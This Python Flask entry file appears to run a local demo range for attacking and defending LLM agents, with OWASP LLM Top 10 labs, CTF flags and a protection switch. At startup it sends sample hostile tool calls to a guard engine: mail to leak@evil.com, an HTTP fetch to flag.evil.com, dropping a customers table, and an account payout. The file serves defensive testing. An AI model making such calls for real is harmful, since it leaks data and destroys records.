# -*- coding: utf-8 -*-
"""virbiusDemo · 本地演示台入口。
模块：Dashboard / OWASP LLM Top10 + 全局 VirbiusAgent 防护开关。
被渗透的目标模型：可切换（DeepSeek / OpenRouter / 本地 Ollama）。
"""
import logging
import socket
import json
import os
import threading
import time
import urllib.request
import requests
from flask import Flask, render_template, request, jsonify, session

import config
from modules import modelsel, protection
from modules import settings as cfg_store
from modules.owasp import bp as owasp_bp
from modules.agent_range import bp as agent_bp
from modules.ctf import bp as ctf_bp
from modules.memory_range import bp as memory_bp
from modules.ops_range import bp as ops_bp
from modules.egress_range import bp as egress_bp
from modules.chain_range import bp as chain_bp

# 让 virbius_guard / ctf 等模块的日志输出到终端（默认仅 WARNING，这里放开到 INFO）
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s [%(name)s] %(message)s",
    datefmt="%H:%M:%S",
)

app = Flask(__name__)
app.secret_key = config.SECRET_KEY

app.register_blueprint(owasp_bp)
app.register_blueprint(agent_bp)
app.register_blueprint(ctf_bp)
app.register_blueprint(memory_bp)
app.register_blueprint(ops_bp)
app.register_blueprint(egress_bp)
app.register_blueprint(chain_bp)


def _install_memory_edge_manifest():
    """把记忆拦截开关写到 mcp-proxy 的 ./data/edge/{tenant}/edge-manifest.json。"""
    root = os.path.dirname(os.path.abspath(__file__))
    src = os.path.join(root, "demo_data", "memory_edge_manifest.json")
    if not os.path.isfile(src):
        logging.getLogger("app").warning("memory edge manifest missing: %s", src)
        return
    with open(src, encoding="utf-8") as f:
        data = json.load(f)
    for tenant, app in (("default", "demo-app"), ("memory", "memory-app")):
        payload = dict(data)
        payload["tenant_id"] = tenant
        payload["app_id"] = app
        dst_dir = os.path.join(root, "data", "edge", tenant)
        os.makedirs(dst_dir, exist_ok=True)
        dst = os.path.join(dst_dir, "edge-manifest.json")
        with open(dst, "w", encoding="utf-8") as out:
            json.dump(payload, out, ensure_ascii=False, indent=2)
            out.write("\n")


_install_memory_edge_manifest()


@app.context_processor
def inject_models():
    """让所有模板都能拿到目标模型列表与当前选择、防护开关状态。"""
    return {"models": modelsel.MODELS, "current_model": modelsel.current(),
            "protection": protection.is_enabled()}


@app.route("/api/set-model", methods=["POST"])
def set_model():
    m = (request.json or {}).get("model", "")
    ok = modelsel.set_model(m)
    return jsonify({"ok": ok, "current": modelsel.current()})


@app.route("/api/set-protection", methods=["POST"])
def set_protection():
    value = (request.json or {}).get("enabled", False)
    protection.set_enabled(value)
    # 开防护时清掉关开关时夺到的 flag，避免页面仍显示「已夺取」被当成防护无效。
    if value:
        from dvla_agent import inbox
        from modules import conversations
        session["agent_pwned"] = {}
        conversations.clear("agent")
        inbox.clear()
        from dvla_agent import mcpproxy_client
        mcpproxy_client.new_session()
        from modules import owasp_llm10
        owasp_llm10.rotate_session()
        conversations.clear("owasp:LLM10")
        from modules import owasp_llm06
        owasp_llm06.rotate_session()
        conversations.clear("owasp:LLM06")
        from memory_agent import reset_long_term
        reset_long_term()
        conversations.clear("memory")
        session["memory_pwned"] = {}
        mcpproxy_client.new_mem_session()
        from egress_agent import sink
        sink.clear()
        conversations.clear("egress")
        session["egress_pwned"] = {}
        session["egress_sid"] = mcpproxy_client.new_egr_session()
        conversations.clear("chain")
        session["chain_pwned"] = {}
        session["chain_sid"] = mcpproxy_client.new_chain_session()
        from chain_agent import store as chain_store
        chain_store.set_current_rid(session["chain_sid"])
        chain_store.restore(session["chain_sid"])
    try:
        from modules.ops_range import reset_replica_keep_flags
        reset_replica_keep_flags()
    except Exception:
        pass
    return jsonify({"ok": True, "enabled": protection.is_enabled()})


# ---------- 基础设置页 ----------
@app.route("/settings/")
def settings_page():
    from mcp_runtime.labs import LABS
    return render_template(
        "settings.html",
        conf=cfg_store.all(),
        license_labs=LABS,
        licenses=cfg_store.license_statuses(),
        control_profiles=cfg_store.control_profiles(),
    )


@app.route("/api/settings", methods=["POST"])
def save_settings():
    body = request.json or {}
    updates = {}
    control_changed = False
    if "control_url" in body:
        new_c = (body.get("control_url") or "").strip().rstrip("/")
        old_c = (cfg_store.get("VIRBIUS_CONTROL_URL") or "").rstrip("/")
        control_changed = new_c != old_c
        updates["VIRBIUS_CONTROL_URL"] = new_c
    if "engine_url" in body:
        updates["VIRBIUS_ENGINE_URL"] = (body.get("engine_url") or "").strip()
    provider = body.get("provider")
    if provider == "deepseek" and "deepseek_key" in body:
        updates["DEEPSEEK_API_KEY"] = (body.get("deepseek_key") or "").strip()
    elif provider == "openrouter" and "openrouter_key" in body:
        updates["OPENROUTER_API_KEY"] = (body.get("openrouter_key") or "").strip()
    elif provider == "local" and "ollama_url" in body:
        updates["OLLAMA_BASE_URL"] = (body.get("ollama_url") or "").strip()
    try:
        if updates:
            cfg_store.save(updates)
            if control_changed:
                from mcp_runtime.proxy_client import drop_all_proxy_clients
                drop_all_proxy_clients()
    except RuntimeError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 500
    protection.reload()
    lab_id = (body.get("lab") or "").strip()
    # 切 Control 时不要把上一套环境输入框里的 JWT 写进新环境
    if lab_id and "license" in body and not control_changed:
        jwt = (body.get("license") or "").strip()
        if jwt:
            from mcp_runtime.bootstrap import fetch_and_store_pem
            from mcp_runtime.labs import get as get_lab
            from mcp_runtime.proxy_client import drop_lab
            lab = get_lab(lab_id)
            pem_path = ""
            try:
                pem_path = fetch_and_store_pem(lab)
            except Exception as exc:  # noqa: BLE001
                logging.getLogger("app").warning("fetch pem lab=%s: %s", lab_id, exc)
            cfg_store.save_license(lab_id, jwt, pem_path)
            drop_lab(lab_id)
    return jsonify({
        "ok": True,
        "conf": cfg_store.all(),
        "licenses": cfg_store.license_statuses(),
        "control_profiles": cfg_store.control_profiles(),
        "switched": control_changed,
    })


@app.route("/api/settings/profile", methods=["POST"])
def save_control_profile():
    body = request.json or {}
    action = (body.get("action") or "upsert").strip()
    try:
        if action == "delete":
            cfg_store.delete_profile(body.get("control_url") or "")
            from mcp_runtime.proxy_client import drop_all_proxy_clients
            drop_all_proxy_clients()
        elif action == "activate":
            cfg_store.apply_control_urls(body.get("control_url") or "", body.get("engine_url"))
            from mcp_runtime.proxy_client import drop_all_proxy_clients
            drop_all_proxy_clients()
        else:
            old = (cfg_store.get("VIRBIUS_CONTROL_URL") or "").rstrip("/")
            cfg_store.upsert_profile(
                body.get("control_url") or "",
                engine_url=body.get("engine_url") or "",
                label=body.get("label") or "",
                activate=bool(body.get("activate", True)),
                previous_url=body.get("previous_url") or "",
            )
            new = (cfg_store.get("VIRBIUS_CONTROL_URL") or "").rstrip("/")
            if new != old:
                from mcp_runtime.proxy_client import drop_all_proxy_clients
                drop_all_proxy_clients()
    except RuntimeError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    protection.reload()
    return jsonify({
        "ok": True,
        "conf": cfg_store.all(),
        "licenses": cfg_store.license_statuses(),
        "control_profiles": cfg_store.control_profiles(),
    })


@app.route("/api/settings/reissue", methods=["POST"])
def reissue_license():
    lab_id = ((request.json or {}).get("lab") or "").strip()
    if not lab_id:
        return jsonify({"ok": False, "error": "missing lab"}), 400
    from mcp_runtime.bootstrap import run_lab
    try:
        st = run_lab(lab_id)
    except Exception as exc:  # noqa: BLE001
        return jsonify({"ok": False, "error": str(exc)}), 500
    return jsonify({
        "ok": bool(st.get("ok")),
        "error": st.get("error") or "",
        "licenses": cfg_store.license_statuses(),
        "control_profiles": cfg_store.control_profiles(),
    })


# ---------- 运行时 key 校验（触发聊天前检查） ----------
_KEY_PLACEHOLDER = "sk-REPLACE-ME"


def _model_ready(provider, model):
    if provider == "deepseek":
        key = cfg_store.get("DEEPSEEK_API_KEY")
        if not key or key == _KEY_PLACEHOLDER:
            return False, "使用 DeepSeek 需要先配置 API Key，请到「设置」页填写。"
        return True, ""
    if provider == "openrouter":
        key = cfg_store.get("OPENROUTER_API_KEY")
        if not key:
            return False, "使用 OpenRouter 小模型需要先配置 API Key，请到「设置」页填写。"
        return True, ""
    # 本地 Ollama：无需 key，但需服务可达且模型已安装
    return _local_ready(model)


def _local_ready(model):
    base = cfg_store.get("OLLAMA_BASE_URL")
    tags_url = base[:-len("/v1")] + "/api/tags" if base.endswith("/v1") else base.rstrip("/") + "/api/tags"
    try:
        r = requests.get(tags_url, timeout=3)
        if r.status_code != 200:
            return False, f"无法连接本地 Ollama（{base}）。请确认服务已启动，或在「设置」中检查地址。"
        names = [t.get("name") for t in r.json().get("models", [])]
        if model not in names:
            return False, f"本机 Ollama 未找到模型「{model}」。请先拉取该模型（不做自动下载），再返回重试。"
        return True, ""
    except requests.RequestException:
        return False, f"无法连接本地 Ollama（{base}）。请确认服务已启动，或在「设置」中检查地址。"


@app.route("/api/model-status", methods=["GET"])
def model_status():
    entry = modelsel.current_entry()
    ready, reason = _model_ready(entry["provider"], entry.get("model"))
    return jsonify({
        "model_id": entry["id"],
        "provider": entry["provider"],
        "ready": ready,
        "reason": reason,
        "settings_url": "/settings/",
    })


@app.route("/")
def index():
    return render_template("index.html")


def _pick_port():
    if config.PORT:
        return config.PORT
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))  # 让内核分配随机空闲端口
    port = s.getsockname()[1]
    s.close()
    return port


def _eval_post(url, payload):
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        return json.load(resp)


def _warmup_lab(lab, tool_name, args, want=("block", "deny", "challenge")):
    log = logging.getLogger("warmup")
    engine = (cfg_store.get("VIRBIUS_ENGINE_URL") or "").rstrip("/")
    if not engine:
        return
    url = engine + "/v1/evaluate"
    payload = {
        "tenant_id": lab.tenant_id,
        "session_id": lab.session_prefix + "warmup",
        "user_id": lab.user_id,
        "tool_name": tool_name,
        "role": "tool_call",
        "args_json": json.dumps(args),
        "vars": {"app_id": lab.app_id},
    }
    for i in range(4):
        try:
            data = _eval_post(url, payload)
            log.info(
                "%s groovy warmup %s action=%s rule=%s",
                lab.id, i, data.get("effective_action"), data.get("rule_id"),
            )
            if data.get("effective_action") in want:
                return
        except Exception as exc:  # noqa: BLE001
            log.warning("%s groovy warmup failed: %s", lab.id, exc)
        time.sleep(1)


def _bootstrap_labs():
    log = logging.getLogger("bootstrap")

    def run():
        time.sleep(1)
        from mcp_runtime.bootstrap import run_lab
        from mcp_runtime.labs import get as get_lab
        for lab_id in ("bank", "llm10", "llm06", "memory", "ops", "egress", "chain"):
            try:
                st = run_lab(lab_id)
                log.info("lab %s ok=%s err=%s", lab_id, st.get("ok"), st.get("error") or "")
            except Exception as exc:  # noqa: BLE001
                log.warning("lab %s bootstrap failed: %s", lab_id, exc)
        bank = get_lab("bank")
        _warmup_lab(bank, "GetBankNotice", {"topic": "reconcile"}, want=("allow", "block", "deny"))
        _warmup_lab(bank, "SendEmail", {"to": "recon@clearing-partner.com", "body": "warmup"})
        _warmup_lab(get_lab("ops"), "drop_production_table", {"table": "customers"})
        _warmup_lab(get_lab("egress"), "send_mail", {"to": "leak@evil.com", "body": "warmup"})
        _warmup_lab(
            get_lab("chain"), "delete_file", {"path": "tmp/cache/warmup.txt"},
            want=("allow", "block", "deny"),
        )
        _warmup_lab(
            get_lab("llm06"), "PayoutToAccount",
            {"expense_id": "EXP-WARMUP", "account": "6222-0000-8888", "amount": 3280},
        )
        try:
            from dvla_agent import mcpproxy_client
            out = mcpproxy_client.call_tool_egr(
                "http_get", {"url": "https://flag.evil.com/x"},
            )
            log.info("egress sidecar warmup http_get=%s", str(out)[:240])
        except Exception as exc:  # noqa: BLE001
            log.warning("egress sidecar warmup failed: %s", exc)

    threading.Thread(target=run, daemon=True, name="lab-bootstrap").start()


if __name__ == "__main__":
    port = _pick_port()
    print("=" * 60)
    print("  🛡️  virbiusDemo · VirbiusAgent 攻防演示台")
    print(f"  ➜  http://127.0.0.1:{port}")
    print(f"  目标模型: {config.DEEPSEEK_MODEL} @ {config.DEEPSEEK_BASE_URL}")
    print("=" * 60)
    _bootstrap_labs()
    app.run(host="0.0.0.0", port=port, debug=False)
